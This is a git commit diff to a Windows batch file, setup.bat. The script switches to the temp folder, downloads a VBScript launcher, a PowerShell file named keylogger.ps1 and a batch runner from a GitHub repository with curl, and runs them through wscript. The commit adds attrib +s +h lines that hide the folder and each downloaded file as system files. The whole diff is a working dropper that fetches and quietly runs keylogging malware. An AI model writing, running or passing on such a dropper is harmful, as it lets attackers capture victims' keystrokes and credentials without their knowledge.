c5ef6847b95d96d3f24f0e4b7b6cf8173f8d523b
Ale-cyber <59205495+Ale-cyber@users.noreply.github.com>
2021-09-10 16:49:04 +0200

    Update setup.bat

--- setup.bat
+++ setup.bat
@@ -3,8 +3,12 @@ cd %temp%
 if not exist test\ (
   mkdir test
 )
+attrib +s +h test
 cd test
 curl -s https://raw.githubusercontent.com/Ale-cyber/test/master/invisible.vbe -o i.vbe
+attrib +s +h i.vbe
 curl -s https://raw.githubusercontent.com/Ale-cyber/test/master/keylogger.ps1 -o p.ps1
+attrib +s +h p.ps1
 curl -s https://raw.githubusercontent.com/Ale-cyber/test/master/run.bat -o r.bat
+attrib +s +h r.bat
 wscript.exe "i.vbe" "r.bat"
